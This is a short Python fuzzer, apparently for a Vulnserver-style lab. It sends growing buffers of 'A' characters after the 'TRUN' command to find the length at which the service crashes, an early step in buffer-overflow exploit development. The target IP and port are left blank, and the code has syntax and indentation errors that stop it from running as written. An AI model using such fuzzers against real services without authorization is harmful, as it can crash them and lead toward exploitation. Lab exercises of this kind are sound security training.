#!/usr/bin/python 
import sys, socket 
from time import sleep 

ip = ''
port= 
buffer = "A" * 100 
command = "TRUN /.:/"


while True: 
    try: 
        payload = command + buffer 
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        s.connect((ip,port)) 
        print ("[+] Sending the payload...\n" + str(len(buffer))) s.send((payload.encode()))
        s.close() 
        sleep(1) 
        buffer = buffer + "A"*100 
    except: print ("The fuzzing crashed at %s bytes" % str(len(buffer))) 
    sys.exit()